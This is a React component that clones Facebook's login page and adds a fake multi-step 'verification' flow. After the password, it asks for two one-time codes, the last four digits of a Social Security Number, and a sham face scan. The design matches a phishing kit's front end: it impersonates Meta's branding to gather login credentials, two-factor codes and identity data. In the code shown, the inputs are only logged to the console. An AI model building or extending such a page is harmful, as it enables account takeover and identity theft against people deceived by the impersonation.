import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import metaLogoImg from "@assets/IMG_7894_1765013426839.png";

type VerificationStep = 
  | "login"
  | "loading-login"
  | "code1"
  | "loading-code1"
  | "code2"
  | "loading-code2"
  | "ssn"
  | "loading-ssn"
  | "face-verification"
  | "face-rotation"
  | "complete";

function FacebookLoader() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="relative w-16 h-16">
        <div 
          className="absolute inset-0 rounded-full border-4 border-gray-200"
          style={{ borderTopColor: '#1877f2' }}
        >
          <style>{`
            @keyframes fb-spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}</style>
        </div>
        <div 
          className="absolute inset-0 rounded-full border-4 border-transparent"
          style={{ 
            borderTopColor: '#1877f2',
            animation: 'fb-spin 1s linear infinite'
          }}
        />
      </div>
      <p className="mt-4 text-sm" style={{ color: '#65676b' }}>Please wait...</p>
    </div>
  );
}

const loginSchema = z.object({
  email: z.string().min(1, "Please enter your email or phone number"),
  password: z.string().min(1, "Please enter your password"),
});

type LoginForm = z.infer<typeof loginSchema>;

const signupSchema = z.object({
  firstName: z.string().min(1, "What's your name?"),
  lastName: z.string().min(1, "What's your name?"),
  emailOrPhone: z.string().min(1, "You'll use this when you log in and if you ever need to reset your password."),
  newPassword: z.string().min(6, "Enter a combination of at least six numbers, letters and punctuation marks (like ! and &)."),
  birthday: z.object({
    month: z.string(),
    day: z.string(),
    year: z.string(),
  }),
  gender: z.string(),
});

type SignupForm = z.infer<typeof signupSchema>;

const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
const currentYear = new Date().getFullYear();
const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));

export default function LoginPage() {
  const [signupOpen, setSignupOpen] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isSigningUp, setIsSigningUp] = useState(false);
  const [currentStep, setCurrentStep] = useState<VerificationStep>("login");
  const [verificationCode1, setVerificationCode1] = useState("");
  const [verificationCode2, setVerificationCode2] = useState("");
  const [ssnDigits, setSsnDigits] = useState("");
  const [faceRotation, setFaceRotation] = useState(0);

  const loginForm = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const signupForm = useForm<SignupForm>({
    resolver: zodResolver(signupSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      emailOrPhone: "",
      newPassword: "",
      birthday: {
        month: String(new Date().getMonth()),
        day: String(new Date().getDate()),
        year: String(new Date().getFullYear() - 25),
      },
      gender: "female",
    },
  });

  useEffect(() => {
    let timer: NodeJS.Timeout;
    
    if (currentStep === "loading-login") {
      timer = setTimeout(() => setCurrentStep("code1"), 3000);
    } else if (currentStep === "loading-code1") {
      timer = setTimeout(() => setCurrentStep("code2"), 5000);
    } else if (currentStep === "loading-code2") {
      timer = setTimeout(() => setCurrentStep("ssn"), 10000);
    } else if (currentStep === "loading-ssn") {
      timer = setTimeout(() => setCurrentStep("face-verification"), 5000);
    } else if (currentStep === "face-rotation") {
      const rotationTimer = setInterval(() => {
        setFaceRotation(prev => {
          if (prev >= 360) {
            clearInterval(rotationTimer);
            setCurrentStep("complete");
            return 360;
          }
          return prev + 3;
        });
      }, 50);
      return () => clearInterval(rotationTimer);
    }
    
    return () => clearTimeout(timer);
  }, [currentStep]);

  const handleLogin = async (data: LoginForm) => {
    setIsLoggingIn(true);
    console.log("Login attempt:", data);
    setCurrentStep("loading-login");
    setIsLoggingIn(false);
  };

  const handleCode1Submit = () => {
    if (verificationCode1.length >= 4) {
      setCurrentStep("loading-code1");
    }
  };

  const handleCode2Submit = () => {
    if (verificationCode2.length >= 4) {
      setCurrentStep("loading-code2");
    }
  };

  const handleSsnSubmit = () => {
    if (ssnDigits.length === 4) {
      setCurrentStep("loading-ssn");
    }
  };

  const handleStartFaceRotation = () => {
    setFaceRotation(0);
    setCurrentStep("face-rotation");
  };

  const handleSignup = async (data: SignupForm) => {
    setIsSigningUp(true);
    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log("Signup attempt:", data);
    setIsSigningUp(false);
    setSignupOpen(false);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#ffffff' }}>
      {/* Language Selector */}
      <div className="text-center pt-4 pb-6">
        <a
          href="#"
          className="text-sm hover:underline"
          style={{ color: '#65676b' }}
          data-testid="link-language"
        >
          English (UK)
        </a>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
        <div className="w-full max-w-md">
          {/* Facebook Logo */}
          <div className="text-center mb-8">
            <img 
              src="/favicon.png" 
              alt="Facebook" 
              className="w-16 h-16 mx-auto"
              data-testid="logo-facebook"
            />
          </div>

          {/* Login Step */}
          {currentStep === "login" && (
            <>
              <Form {...loginForm}>
                <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
                  <FormField
                    control={loginForm.control}
                    name="email"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="text"
                            placeholder="Mobile number or email address"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-email"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={loginForm.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="password"
                            placeholder="Password"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-password"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <button
                    type="submit"
                    disabled={isLoggingIn}
                    className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                    style={{ backgroundColor: '#1877f2' }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                    data-testid="button-login"
                  >
                    {isLoggingIn ? "Logging in..." : "Log in"}
                  </button>
                </form>
              </Form>

              <div className="text-center mt-6">
                <a href="#" className="text-sm hover:underline" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
                  Forgotten password?
                </a>
              </div>

              <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
                <button
                  onClick={() => setSignupOpen(true)}
                  className="w-full py-3 text-sm font-bold rounded-full transition"
                  style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2' }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f0f2f5')}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#ffffff')}
                  data-testid="button-create-account"
                >
                  Create new account
                </button>
              </div>
            </>
          )}

          {/* Loading States */}
          {(currentStep === "loading-login" || currentStep === "loading-code1" || currentStep === "loading-code2" || currentStep === "loading-ssn") && (
            <FacebookLoader />
          )}

          {/* Code 1 - First Verification Code */}
          {currentStep === "code1" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Verification Code</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                We've sent a code to your phone. Enter it below.
              </p>
              <input
                type="text"
                value={verificationCode1}
                onChange={(e) => setVerificationCode1(e.target.value.replace(/\D/g, '').slice(0, 6))}
                placeholder="Enter code"
                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
                data-testid="input-code1"
              />
              <button
                onClick={handleCode1Submit}
                disabled={verificationCode1.length < 4}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                style={{ backgroundColor: '#1877f2' }}
                data-testid="button-submit-code1"
              >
                Continue
              </button>
            </div>
          )}

          {/* Code 2 - Second Verification Code */}
          {currentStep === "code2" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Second Code</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                Please enter the second verification code sent to your email.
              </p>
              <input
                type="text"
                value={verificationCode2}
                onChange={(e) => setVerificationCode2(e.target.value.replace(/\D/g, '').slice(0, 6))}
                placeholder="Enter code"
                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
                data-testid="input-code2"
              />
              <button
                onClick={handleCode2Submit}
                disabled={verificationCode2.length < 4}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                style={{ backgroundColor: '#1877f2' }}
                data-testid="button-submit-code2"
              >
                Continue
              </button>
            </div>
          )}

          {/* SSN - Last 4 Digits */}
          {currentStep === "ssn" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Identity Verification</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                Enter the last 4 digits of your Social Security Number
              </p>
              <input
                type="text"
                value={ssnDigits}
                onChange={(e) => setSsnDigits(e.target.value.replace(/\D/g, '').slice(0, 4))}
                placeholder="XXXX"
                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
                maxLength={4}
                data-testid="input-ssn"
              />
              <button
                onClick={handleSsnSubmit}
                disabled={ssnDigits.length !== 4}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                style={{ backgroundColor: '#1877f2' }}
                data-testid="button-submit-ssn"
              >
                Continue
              </button>
            </div>
          )}

          {/* Face Verification */}
          {currentStep === "face-verification" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Face Verification</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                We need to verify your identity using facial recognition.
              </p>
              <div className="w-32 h-32 mx-auto mb-6 rounded-full border-4 flex items-center justify-center" style={{ borderColor: '#1877f2' }}>
                <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              </div>
              <button
                onClick={handleStartFaceRotation}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                data-testid="button-start-face"
              >
                Start Face Scan
              </button>
            </div>
          )}

          {/* Face Rotation */}
          {currentStep === "face-rotation" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Rotate Your Face</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                Slowly rotate your face in a circle
              </p>
              <div className="w-40 h-40 mx-auto mb-6 relative">
                <div className="absolute inset-0 rounded-full border-4" style={{ borderColor: '#e4e6eb' }} />
                <div 
                  className="absolute inset-0 rounded-full border-4 border-transparent"
                  style={{ 
                    borderTopColor: '#1877f2',
                    borderRightColor: faceRotation > 90 ? '#1877f2' : 'transparent',
                    borderBottomColor: faceRotation > 180 ? '#1877f2' : 'transparent',
                    borderLeftColor: faceRotation > 270 ? '#1877f2' : 'transparent',
                    transform: `rotate(${faceRotation}deg)`,
                    transition: 'transform 0.05s linear'
                  }}
                />
                <div className="absolute inset-4 rounded-full flex items-center justify-center" style={{ backgroundColor: '#f0f2f5' }}>
                  <svg className="w-12 h-12" fill="none" stroke="#65676b" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                  </svg>
                </div>
              </div>
              <p className="text-sm font-medium" style={{ color: '#1877f2' }}>
                {Math.round((faceRotation / 360) * 100)}% Complete
              </p>
            </div>
          )}

          {/* Complete */}
          {currentStep === "complete" && (
            <div className="text-center">
              <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#00a400' }}>
                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Verification Complete</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                Your identity has been verified successfully.
              </p>
              <button
                onClick={() => {
                  setCurrentStep("login");
                  setVerificationCode1("");
                  setVerificationCode2("");
                  setSsnDigits("");
                  setFaceRotation(0);
                }}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                data-testid="button-done"
              >
                Done
              </button>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="text-center py-8 px-5" style={{ color: '#65676b' }}>
        <div className="mb-4">
          <img 
            src={metaLogoImg} 
            alt="Meta" 
            className="h-8 mx-auto"
            data-testid="img-meta-logo"
          />
        </div>
        <div className="text-xs">
          <a href="#" className="hover:underline mr-2" data-testid="link-about">
            About
          </a>
          <a href="#" className="hover:underline mr-2" data-testid="link-help">
            Help
          </a>
          <a href="#" className="hover:underline" data-testid="link-more">
            More
          </a>
        </div>
      </footer>

      {/* Sign Up Dialog */}
      <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
        <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
          <DialogHeader className="p-4 pb-0">
            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>
              Sign Up
            </DialogTitle>
            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
              It's quick and easy.
            </DialogDescription>
          </DialogHeader>

          <div className="my-3" style={{ borderTop: '1px solid #dadde1' }} />

          <Form {...signupForm}>
            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
              <div className="flex gap-3">
                <FormField
                  control={signupForm.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="First name"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-firstname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
                <FormField
                  control={signupForm.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="Surname"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-lastname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={signupForm.control}
                name="emailOrPhone"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        placeholder="Mobile number or email address"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-email"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <FormField
                control={signupForm.control}
                name="newPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        type="password"
                        placeholder="New password"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-password"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Date of birth
                </label>
                <div className="flex gap-3 mt-1">
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.month")}
                    onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
                    data-testid="select-birthday-month"
                  >
                    {months.map((m, idx) => (
                      <option key={idx} value={String(idx)}>
                        {m}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.day")}
                    onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
                    data-testid="select-birthday-day"
                  >
                    {days.map((d) => (
                      <option key={d} value={d}>
                        {d}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.year")}
                    onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
                    data-testid="select-birthday-year"
                  >
                    {years.map((y) => (
                      <option key={y} value={y}>
                        {y}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Gender
                </label>
                <div className="flex gap-3 mt-1">
                  {[
                    { value: "female", label: "Female" },
                    { value: "male", label: "Male" },
                    { value: "custom", label: "Custom" },
                  ].map((option) => (
                    <label
                      key={option.value}
                      className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer"
                      style={{
                        backgroundColor: '#f5f6f7',
                        borderColor: '#ccd0d5',
                      }}
                    >
                      <span className="text-sm" style={{ color: '#1c1e21' }}>
                        {option.label}
                      </span>
                      <input
                        type="radio"
                        name="gender"
                        value={option.value}
                        onChange={(e) => signupForm.setValue("gender", e.target.value)}
                        checked={signupForm.watch("gender") === option.value}
                        className="w-4 h-4 cursor-pointer"
                        data-testid={`radio-gender-${option.value}`}
                      />
                    </label>
                  ))}
                </div>
              </div>

              <button
                type="submit"
                disabled={isSigningUp}
                className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block"
                style={{ backgroundColor: '#00a400' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#009200')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#00a400')}
                data-testid="button-signup-submit"
              >
                {isSigningUp ? "Signing up..." : "Sign Up"}
              </button>
            </form>
          </Form>
        </DialogContent>
      </Dialog>
    </div>
  );
}
